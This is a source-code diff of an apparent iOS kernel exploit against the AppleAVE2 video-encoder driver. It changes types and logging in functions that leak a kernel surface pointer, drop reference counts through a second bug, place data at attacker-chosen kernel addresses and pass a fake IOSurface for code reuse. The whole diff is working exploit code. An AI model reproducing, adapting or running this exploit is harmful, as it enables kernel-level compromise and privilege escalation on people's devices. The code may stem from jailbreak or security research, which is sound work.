@@ -7,17 +7,18 @@ static io_connect_t g_surface_conn = 0;
 static io_connect_t g_apple_ave_conn = 0;
 
 /* Due to ref leak bugs in AppleAVE2, this surface will, unfortunately, never be freed */
-static void * g_bad_surface_that_will_never_be_freed_kernel_ptr = NULL;
+static uint64_t g_bad_surface_that_will_never_be_freed_kernel_ptr = 0;
 static uint32_t g_bad_surface_that_will_never_be_freed = 0;
-static void * g_bad_surface_buffer = NULL;
+static uint64_t g_bad_surface_buffer = 0;
+static size_t g_bad_surface_buffer_size = 0;
 
 /*
  * Function name: 	apple_ave_pwn_get_bad_surface_kernel_ptr
  * Description:		Gets the kernel pointer of our g_bad_surface_that_will_never_be_freed.
- * Returns:			void *.
+ * Returns:			uint64_t.
  */
 
-void * apple_ave_pwn_get_bad_surface_kernel_ptr() {
+uint64_t apple_ave_pwn_get_bad_surface_kernel_ptr() {
 	
 	return g_bad_surface_that_will_never_be_freed_kernel_ptr;
 }
@@ -28,7 +29,7 @@ void * apple_ave_pwn_get_bad_surface_kernel_ptr() {
  * Returns:			kern_return_t.
  */
 
-kern_return_t apple_ave_pwn_drop_surface_refcount(void * surface_kernel_address) {
+kern_return_t apple_ave_pwn_drop_surface_refcount(uint64_t surface_kernel_address) {
 	
 	kern_return_t ret = KERN_SUCCESS;
 	io_connect_t apple_ave_conn_for_drop_refcount = 0;
@@ -64,7 +65,7 @@ kern_return_t apple_ave_pwn_drop_surface_refcount(void * surface_kernel_address)
 	input_buffer[0x2F4] = 1;
 
 	/* the surface kernel address to drop */
-	*(void**)(input_buffer + 0x100) = surface_kernel_address;
+	*(uint64_t*)(input_buffer + 0x100) = surface_kernel_address;
 
 	/* this will fail the call, after the surface kernel address is already "attached" */
 	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_info_type)) = 0xffff;
@@ -77,7 +78,6 @@ kern_return_t apple_ave_pwn_drop_surface_refcount(void * surface_kernel_address)
 	ret = apple_ave_utils_prepare_to_encode_frames(apple_ave_conn_for_drop_refcount, input_buffer, output_buffer);
 	if (kIOReturnError != ret)
 	{
-		printf("[ERROR]: preparing to encode frames...\n");
 		goto cleanup;
 	}
 
@@ -104,7 +104,7 @@ cleanup:
  * Returns:			kern_return_t and surface kernel address in output params.
  */
 
-kern_return_t apple_ave_pwn_get_surface_kernel_address(uint32_t surface_id, void ** surface_kernel_address) {
+kern_return_t apple_ave_pwn_get_surface_kernel_address(uint32_t surface_id, uint64_t * surface_kernel_address) {
 	
 	kern_return_t ret = KERN_SUCCESS;
 
@@ -114,25 +114,18 @@ kern_return_t apple_ave_pwn_get_surface_kernel_address(uint32_t surface_id, void
     bzero(input_buffer, sizeof(input_buffer));
     bzero(output_buffer, sizeof(output_buffer));
 
-    // Don't try
-//    fuzz_encode_frames(g_apple_ave_conn, g_bad_surface_that_will_never_be_freed, surface_id);
-    
-	//*(unsigned int*)input_buffer = 0xDEADBEEF;
-	*(unsigned int*)(input_buffer + 0x4) = g_bad_surface_that_will_never_be_freed;
-	*(unsigned int*)(input_buffer + 0x8) = g_bad_surface_that_will_never_be_freed;
-	*(unsigned int*)(input_buffer + 0xC) = surface_id;
-	*(unsigned int*)(input_buffer + 0xD4) = g_bad_surface_that_will_never_be_freed;
-	*(unsigned int*)(input_buffer + 0xD8) = g_bad_surface_that_will_never_be_freed;
-	*(unsigned int*)(input_buffer + 0xE8) = g_bad_surface_that_will_never_be_freed;
-	*(unsigned int*)(input_buffer + 0xEC) = g_bad_surface_that_will_never_be_freed;
-
-    // The following is used for VXE380, generated using the test script in the scripts folder.
-    // It bypasses the checks in method 7 but then causes a kernel panic for some reason.
-    // If you figure it out, let me know!
-//    *(unsigned int*)(input_buffer + 0x14) = 0x10007ef; // 0x100006b should work according to the script but it doesn't?
+	
+    *(unsigned int*)(input_buffer + 0x4) = g_bad_surface_that_will_never_be_freed;
+    *(unsigned int*)(input_buffer + 0x8) = g_bad_surface_that_will_never_be_freed;
+    *(unsigned int*)(input_buffer + 0xC) = surface_id;
+    *(unsigned int*)(input_buffer + 0xD4) = g_bad_surface_that_will_never_be_freed;
+    *(unsigned int*)(input_buffer + 0xD8) = g_bad_surface_that_will_never_be_freed;
+    *(unsigned int*)(input_buffer + 0xE8) = g_bad_surface_that_will_never_be_freed;
+    *(unsigned int*)(input_buffer + 0xEC) = g_bad_surface_that_will_never_be_freed;
     input_buffer[0xFC] = 1;
     input_buffer[0x2F4] = 1;
 
+    
 	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_info_type)) = 0x4567;
 
 	*((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_chroma_format_idc)) = 1;
@@ -143,16 +136,16 @@ kern_return_t apple_ave_pwn_get_surface_kernel_address(uint32_t surface_id, void
 	ret = apple_ave_utils_prepare_to_encode_frames(g_apple_ave_conn, input_buffer, output_buffer);
 	if (KERN_SUCCESS != ret) {
 		printf("[ERROR]: apple_ave_pwn_get_surface_kernel_address preparing to encode frames...\n");
-		goto cleanup;
+		return ret;
 	}
 
-	*surface_kernel_address = *(void**)output_buffer;
+	*surface_kernel_address = *(uint64_t*)output_buffer;
 
 	/* Leaking the address also leaks a refcount. So we drop it manually (using, you guessed, another vulnerability). */
 	apple_ave_pwn_drop_surface_refcount(*surface_kernel_address);
+    
 
-cleanup:
-	return ret;
+    return ret;
 }
 
 
@@ -163,7 +156,7 @@ cleanup:
  * Returns:			kern_return_t.
  */
 
-kern_return_t apple_ave_pwn_put_data_in_bulk(void * address_with_data) {
+kern_return_t apple_ave_pwn_put_data_in_bulk(uint64_t address_with_data) {
 	
 	kern_return_t ret = KERN_SUCCESS;
     char input_buffer[OFFSET(encode_frame_input_buffer_size)];
@@ -186,14 +179,14 @@ kern_return_t apple_ave_pwn_put_data_in_bulk(void * address_with_data) {
 
 	*(unsigned int*)((char*)g_bad_surface_buffer + offsets_get_offsets().encode_frame_offset_info_type) = 0x4569;
 
-	*(void**)((char*)g_bad_surface_buffer + offsets_get_offsets().encode_frame_offset_iosurface_buffer_mgr) = address_with_data;
+	*(uint64_t*)((char*)g_bad_surface_buffer + offsets_get_offsets().encode_frame_offset_iosurface_buffer_mgr) = address_with_data;
 	*((char*)g_bad_surface_buffer + offsets_get_offsets().encode_frame_offset_keep_cache) = 0;
-	//*(unsigned int*)((char*)g_bad_surface_buffer + 0xC) = 5;
+//	*(unsigned int*)((char*)g_bad_surface_buffer + 0xC) = 5; // multiPassEndPassCounterWFR
 
 	ret = apple_ave_utils_encode_frame(g_apple_ave_conn, input_buffer, output_buffer);
 	if (KERN_SUCCESS != ret)
 	{
-		//printf("[ERROR]: preparing to encode frames...\n");
+		printf("[ERROR]: encoding frames for address 0x%llx\n", address_with_data);
 		goto cleanup;
 	}
 
@@ -250,7 +243,8 @@ kern_return_t apple_ave_pwn_init() {
         printf("[INFO]: successfully created a global surface with id: %d\n", g_bad_surface_that_will_never_be_freed);
     }
 
-	g_bad_surface_buffer = *(void**)surface_data;
+	g_bad_surface_buffer = *(uint64_t*)surface_data;
+    g_bad_surface_buffer_size = *(uint32_t*)(surface_data+0x14);
 
     // There's a check in some drivers if the surface id is >= 9
     if (g_bad_surface_that_will_never_be_freed >= 9) {
@@ -261,7 +255,7 @@ kern_return_t apple_ave_pwn_init() {
 	if (KERN_SUCCESS != ret) {
 		printf("[ERROR]: apple_ave_pwn_init getting kernel pointer for surface %d\n", g_bad_surface_that_will_never_be_freed);
 	} else {
-		printf("[INFO]: g_bad_surface_that_will_never_be_freed's kernel pointer is %p\n", g_bad_surface_that_will_never_be_freed_kernel_ptr);
+		printf("[INFO]: g_bad_surface_that_will_never_be_freed's kernel pointer is %llu\n", g_bad_surface_that_will_never_be_freed_kernel_ptr);
 	}
 
 cleanup:
@@ -321,16 +315,18 @@ kern_return_t apple_ave_pwn_cleanup() {
  */
 
 static
-void apple_ave_pwn_initialize_input_buffer_for_fake_iosurface_usage(void * input_buffer, void * fake_iosurface_address) {
+void apple_ave_pwn_initialize_input_buffer_for_fake_iosurface_usage(void * input_buffer, uint64_t fake_iosurface_address) {
 
 	int i = 0;
 
 	for(i = 4; i < 0x100; i += 4) {
-		*(unsigned int*)((char*)input_buffer + i) = g_bad_surface_that_will_never_be_freed;		
+		*(unsigned int*)((char*)input_buffer + i) = g_bad_surface_that_will_never_be_freed;
 	}
 
-	*(void**)((char*)input_buffer + 0x100) = fake_iosurface_address;
-	*(void**)((char*)input_buffer + 0x108) = fake_iosurface_address;
+    *(unsigned int*)((char*)input_buffer + 0x48) = g_bad_surface_that_will_never_be_freed;
+	*(uint64_t*)((char*)input_buffer + 0x100) = fake_iosurface_address;
+    *(uint64_t*)((char*)input_buffer + 0x108) = fake_iosurface_address;
+    *(uint64_t*)((char*)input_buffer + 0x110) = fake_iosurface_address;
 }
 
 
@@ -341,7 +337,7 @@ void apple_ave_pwn_initialize_input_buffer_for_fake_iosurface_usage(void * input
  * Returns:			kern_return_t.
  */
 
-kern_return_t apple_ave_pwn_use_fake_iosurface(void * fake_iosurface_address) {
+kern_return_t apple_ave_pwn_use_fake_iosurface(uint64_t fake_iosurface_address) {
 	
 	kern_return_t ret = KERN_SUCCESS;
 	io_connect_t apple_ave_rop_conn = 0;
@@ -357,6 +353,10 @@ kern_return_t apple_ave_pwn_use_fake_iosurface(void * fake_iosurface_address) {
 	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_slice_per_frame)) = 0x1;
 
 	apple_ave_pwn_initialize_input_buffer_for_fake_iosurface_usage(input_buffer, fake_iosurface_address);
+
+    printf("[INFO]: passing the bad surface: %x to set session settings (method 3)\n", g_bad_surface_that_will_never_be_freed);
+    printf("[INFO]: fake io surface address is: 0x%llx\n", (uint64_t)fake_iosurface_address);
+    
 
 	ret = apple_ave_utils_get_connection(&apple_ave_rop_conn);
 	if (KERN_SUCCESS != ret)
@@ -375,11 +375,9 @@ kern_return_t apple_ave_pwn_use_fake_iosurface(void * fake_iosurface_address) {
 	}
 
 	ret = apple_ave_utils_set_session_settings(apple_ave_rop_conn, input_buffer, output_buffer);
-	if (KERN_SUCCESS != ret)
-	{
-		printf("[ERROR]: setting session settings");
-		goto cleanup;
-	}
+    if (KERN_SUCCESS != ret)
+        goto cleanup;
+		
 
 cleanup:
 
